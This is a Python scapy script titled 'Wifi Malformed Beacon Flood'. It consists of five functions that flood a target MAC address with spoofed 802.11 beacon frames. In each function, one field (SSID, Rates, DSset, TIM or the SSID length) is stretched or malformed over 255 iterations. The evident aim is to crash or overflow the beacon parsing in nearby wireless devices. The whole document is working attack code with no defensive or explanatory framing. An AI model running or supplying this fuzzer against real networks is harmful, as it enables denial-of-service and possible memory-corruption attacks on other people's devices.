#!/usr/bin/env python2
 
#Wifi Malformed Beacon Flood - scapy library.
 
from scapy.all import *
 
def beacon_overflow_one(target,i):
  for i in range (1,256):
    sendp(
      RadioTap()/
      Dot11(addr1=target,addr2=RandMAC(),addr3=RandMAC())/
      Dot11Beacon(cap="ESS")/
      Dot11Elt(ID="SSID", len=9,info="00"*i)/
      Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16')/
      Dot11Elt(ID="DSset",info="\x03")/
      Dot11Elt(ID="TIM",info="\x00\x01\x00\x00")
    )
 
def beacon_overflow_two(target,i):
  for i in range (1,256):
    sendp(
      RadioTap()/
      Dot11(addr1=target,addr2=RandMAC(),addr3=RandMAC())/
      Dot11Beacon(cap="ESS")/
      Dot11Elt(ID="SSID", len=9,info="")/
      Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16'*i)/
      Dot11Elt(ID="DSset",info="\x03")/
      Dot11Elt(ID="TIM",info="\x00\x01\x00\x00")
    )
 
def beacon_overflow_three(target,i):
  for i in range (1,256):
    sendp(
      RadioTap()/
      Dot11(addr1=target,addr2=RandMAC(),addr3=RandMAC())/
      Dot11Beacon(cap="ESS")/
      Dot11Elt(ID="SSID", len=9,info="MYNETWORK")/
      Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16')/
      Dot11Elt(ID="DSset",info="\x03"*i)/
      Dot11Elt(ID="TIM",info="\x00\x01\x00\x00")
   )
 
def beacon_overflow_four(target,i):
  for i in range (1,256):
    sendp(
      RadioTap()/
      Dot11(addr1=target,addr2=RandMAC(),addr3=RandMAC())/
      Dot11Beacon(cap="ESS")/
      Dot11Elt(ID="SSID",  len=9,info="MYNETWORK")/
      Dot11Elt(ID="Rates", info='\x82\x84\x0b\x16')/
      Dot11Elt(ID="DSset", info="\x03")/
      Dot11Elt(ID="TIM",   info="\x00\x01\x00\x00"*i)
    )
 
def beacon_overflow_five(target,i):
  for i in range (1,256):
    sendp(
      RadioTap()/
      Dot11(addr1=target,addr2=RandMAC(),addr3=RandMAC())/
      Dot11Beacon(cap="ESS")/
      Dot11Elt(ID="SSID", len=i,info="00"*i)/
      Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16')/
      Dot11Elt(ID="DSset",info="\x03")/
      Dot11Elt(ID="TIM",info="\x00\x01\x00\x00")
    )
